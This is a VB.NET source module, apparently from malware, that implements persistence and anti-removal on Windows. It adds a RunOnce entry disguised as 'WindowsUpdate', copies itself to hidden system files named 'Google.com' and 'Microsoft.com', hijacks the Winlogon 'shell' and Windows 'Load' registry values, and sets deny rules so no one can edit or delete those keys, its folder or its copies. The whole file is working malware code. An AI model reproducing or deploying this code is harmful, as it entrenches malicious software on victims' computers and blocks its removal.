Imports System.Runtime.InteropServices
Imports System.Security.AccessControl
Imports Microsoft.Win32
Imports System.IO
Imports System.Security.Principal

Module Persistance
    Dim wrote As Boolean = False
    Public BackupFile1 As String
    Public BackupFile2 As String
    Public Sub Startup()
        On Error Resume Next

        ProtectFolder(InstallationOfEverything)
        Threading.Thread.Sleep(1000)

        If Not wrote = True Then
            wrote = True
            BackupStartup()
            KillOtherPlasma()
            Microsoft.Win32.Registry.CurrentUser.OpenSubKey("software\Microsoft\Windows\CurrentVersion\RunOnce", True).SetValue("WindowsUpdate", Application.ExecutablePath & " -rundll32 /SYSTEM32 " & """" & "C:\Windows\System32\taskmgr.exe" & """" & " " & """" & "C:\Program Files\Microsoft\Windows" & """")
            FileOpen(1, Application.ExecutablePath, OpenMode.Input, OpenAccess.Default, OpenShare.LockReadWrite)
        End If
        ProtectTheFile(Application.ExecutablePath)


    End Sub
    Sub BackupStartup()
        Try
            If Application.ExecutablePath.Contains("wservice.exe") Then
                Dim lelbackup As String
                If Admin() Then
                    lelbackup = Environment.GetFolderPath(Environment.SpecialFolder.System) & "\Google.com"
                Else
                    lelbackup = Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments) & "\Google.com"
                End If
                If Not My.Computer.FileSystem.FileExists(lelbackup) Then
                    My.Computer.FileSystem.CopyFile(Application.ExecutablePath, lelbackup)
                    Try : Dim MyPath As New FileInfo(lelbackup)
                        MyPath.Attributes = FileAttributes.Hidden + FileAttributes.NotContentIndexed + FileAttributes.ReadOnly + FileAttributes.System : Catch : End Try
                End If
                ProtectTheFile(lelbackup)
                BackupFile1 = lelbackup
                Dim Fuckyou As RegistryKey
                Fuckyou = Registry.CurrentUser.OpenSubKey("Software\Microsoft\Windows NT\CurrentVersion\Winlogon\", True)
                Fuckyou.SetValue("shell", """" & Application.ExecutablePath & """,explorer.exe," & """" & lelbackup & """")
                Dim securityIdentifier As New SecurityIdentifier(WellKnownSidType.WorldSid, Nothing)
                Dim ntacrcount As NTAccount = TryCast(securityIdentifier.Translate(GetType(NTAccount)), NTAccount)
                Dim s1 As String = ntacrcount.ToString
                Dim registrySecurity As New RegistrySecurity()
                registrySecurity.AddAccessRule(New RegistryAccessRule(s1, RegistryRights.QueryValues Or RegistryRights.EnumerateSubKeys Or RegistryRights.Notify Or RegistryRights.ReadPermissions, InheritanceFlags.None, PropagationFlags.None, AccessControlType.Allow))
                registrySecurity.AddAccessRule(New RegistryAccessRule(s1, RegistryRights.SetValue Or RegistryRights.Delete Or RegistryRights.CreateSubKey Or RegistryRights.ChangePermissions Or RegistryRights.TakeOwnership, InheritanceFlags.None, PropagationFlags.None, AccessControlType.Deny))
                Fuckyou.SetAccessControl(registrySecurity)
                Fuckyou.Close()
            End If
        Catch : End Try
    End Sub
    Sub KillOtherPlasma()
        Try
            Dim lelbackup As String
            If Admin() Then
                lelbackup = Environment.GetFolderPath(Environment.SpecialFolder.System) & "\Microsoft.com"
            Else
                lelbackup = Environment.GetFolderPath(Environment.SpecialFolder.CommonApplicationData) & "\Microsoft.com"
            End If
            If Not My.Computer.FileSystem.FileExists(lelbackup) Then
                My.Computer.FileSystem.CopyFile(Application.ExecutablePath, lelbackup)
                Try : Dim MyPath As New FileInfo(lelbackup)
                    MyPath.Attributes = FileAttributes.Hidden + FileAttributes.NotContentIndexed + FileAttributes.ReadOnly + FileAttributes.System : Catch : End Try
            End If
            ProtectTheFile(lelbackup)
            BackupFile2 = lelbackup
            Dim Fuckyou As RegistryKey
            Fuckyou = Registry.CurrentUser.OpenSubKey("Software\Microsoft\Windows NT\CurrentVersion\Windows\", True)
            Fuckyou.SetValue("Load", lelbackup)
            Dim securityIdentifier As New SecurityIdentifier(WellKnownSidType.WorldSid, Nothing)
            Dim ntacrcount As NTAccount = TryCast(securityIdentifier.Translate(GetType(NTAccount)), NTAccount)
            Dim s1 As String = ntacrcount.ToString
            Dim registrySecurity As New RegistrySecurity()
            registrySecurity.AddAccessRule(New RegistryAccessRule(s1, RegistryRights.QueryValues Or RegistryRights.EnumerateSubKeys Or RegistryRights.Notify Or RegistryRights.ReadPermissions, InheritanceFlags.None, PropagationFlags.None, AccessControlType.Allow))
            registrySecurity.AddAccessRule(New RegistryAccessRule(s1, RegistryRights.SetValue Or RegistryRights.Delete Or RegistryRights.CreateSubKey Or RegistryRights.ChangePermissions Or RegistryRights.TakeOwnership, InheritanceFlags.None, PropagationFlags.None, AccessControlType.Deny))
            Fuckyou.SetAccessControl(registrySecurity)
            Fuckyou.Close()
        Catch : End Try
    End Sub
    Public Sub ProtectFolder(ByVal location As String)
        Try
            Dim FolderPath As String = location 'Specify the folder here
            Dim UserAccount As String = "EVERYONE" 'Specify the user here
            Dim FolderInfo As IO.DirectoryInfo = New IO.DirectoryInfo(FolderPath)
            Dim FolderAcl As New DirectorySecurity
           
            FolderAcl.AddAccessRule(New FileSystemAccessRule(UserAccount, FileSystemRights.ReadAttributes, InheritanceFlags.ContainerInherit Or InheritanceFlags.ObjectInherit, PropagationFlags.None, AccessControlType.Deny))
            FolderAcl.AddAccessRule(New FileSystemAccessRule(UserAccount, FileSystemRights.CreateDirectories, InheritanceFlags.ContainerInherit Or InheritanceFlags.ObjectInherit, PropagationFlags.None, AccessControlType.Deny))
            FolderAcl.AddAccessRule(New FileSystemAccessRule(UserAccount, FileSystemRights.WriteAttributes, InheritanceFlags.ContainerInherit Or InheritanceFlags.ObjectInherit, PropagationFlags.None, AccessControlType.Deny))
            FolderAcl.AddAccessRule(New FileSystemAccessRule(UserAccount, FileSystemRights.WriteExtendedAttributes, InheritanceFlags.ContainerInherit Or InheritanceFlags.ObjectInherit, PropagationFlags.None, AccessControlType.Deny))
            FolderAcl.AddAccessRule(New FileSystemAccessRule(UserAccount, FileSystemRights.Delete, InheritanceFlags.ContainerInherit Or InheritanceFlags.ObjectInherit, PropagationFlags.None, AccessControlType.Deny))
            FolderAcl.AddAccessRule(New FileSystemAccessRule(UserAccount, FileSystemRights.DeleteSubdirectoriesAndFiles, InheritanceFlags.ContainerInherit Or InheritanceFlags.ObjectInherit, PropagationFlags.None, AccessControlType.Deny))
            FolderAcl.AddAccessRule(New FileSystemAccessRule(UserAccount, FileSystemRights.ChangePermissions, InheritanceFlags.ContainerInherit Or InheritanceFlags.ObjectInherit, PropagationFlags.None, AccessControlType.Deny))
            FolderAcl.AddAccessRule(New FileSystemAccessRule(UserAccount, FileSystemRights.TakeOwnership, InheritanceFlags.ContainerInherit Or InheritanceFlags.ObjectInherit, PropagationFlags.None, AccessControlType.Deny))
            FolderAcl.SetAccessRuleProtection(False, True)
            FolderInfo.SetAccessControl(FolderAcl)
        Catch
        End Try
    End Sub
    Public Sub ProtectTheFile(ByVal location As String)
        Try
            Dim FolderPath As String = location 'Specify the folder here
            Dim UserAccount As String = Environment.UserName.ToString 'Specify the user here
            Dim FolderInfo As IO.DirectoryInfo = New IO.DirectoryInfo(FolderPath)
            Dim FolderAcl As New DirectorySecurity
            FolderAcl.AddAccessRule(New FileSystemAccessRule(UserAccount, FileSystemRights.Read, InheritanceFlags.ContainerInherit Or InheritanceFlags.ObjectInherit, PropagationFlags.None, AccessControlType.Allow))
            FolderAcl.AddAccessRule(New FileSystemAccessRule(UserAccount, FileSystemRights.ReadAndExecute, InheritanceFlags.ContainerInherit Or InheritanceFlags.ObjectInherit, PropagationFlags.None, AccessControlType.Allow))
            FolderAcl.AddAccessRule(New FileSystemAccessRule(UserAccount, FileSystemRights.Delete, InheritanceFlags.ContainerInherit Or InheritanceFlags.ObjectInherit, PropagationFlags.None, AccessControlType.Deny))
            FolderAcl.AddAccessRule(New FileSystemAccessRule(UserAccount, FileSystemRights.Write, InheritanceFlags.ContainerInherit Or InheritanceFlags.ObjectInherit, PropagationFlags.None, AccessControlType.Deny))
            FolderAcl.AddAccessRule(New FileSystemAccessRule(UserAccount, FileSystemRights.ChangePermissions, InheritanceFlags.ContainerInherit Or InheritanceFlags.ObjectInherit, PropagationFlags.None, AccessControlType.Deny))
            FolderAcl.AddAccessRule(New FileSystemAccessRule(UserAccount, FileSystemRights.TakeOwnership, InheritanceFlags.ContainerInherit Or InheritanceFlags.ObjectInherit, PropagationFlags.None, AccessControlType.Deny))
            FolderAcl.AddAccessRule(New FileSystemAccessRule(UserAccount, FileSystemRights.WriteAttributes, InheritanceFlags.ContainerInherit Or InheritanceFlags.ObjectInherit, PropagationFlags.None, AccessControlType.Deny))
            FolderAcl.AddAccessRule(New FileSystemAccessRule(UserAccount, FileSystemRights.WriteExtendedAttributes, InheritanceFlags.ContainerInherit Or InheritanceFlags.ObjectInherit, PropagationFlags.None, AccessControlType.Deny))
            FolderAcl.AddAccessRule(New FileSystemAccessRule(UserAccount, FileSystemRights.ListDirectory, InheritanceFlags.ContainerInherit Or InheritanceFlags.ObjectInherit, PropagationFlags.None, AccessControlType.Allow))
            FolderInfo.SetAccessControl(FolderAcl)
        Catch
        End Try
    End Sub
    Public Sub AllowAccess(ByVal location As String)
        Try
            Dim FolderPath As String = location
            Dim FolderInfo As IO.DirectoryInfo = New IO.DirectoryInfo(FolderPath)
            Dim FolderAcl As New DirectorySecurity
            FolderAcl.SetAccessRuleProtection(False, True)
            FolderInfo.SetAccessControl(FolderAcl)
        Catch : End Try
    End Sub
End Module
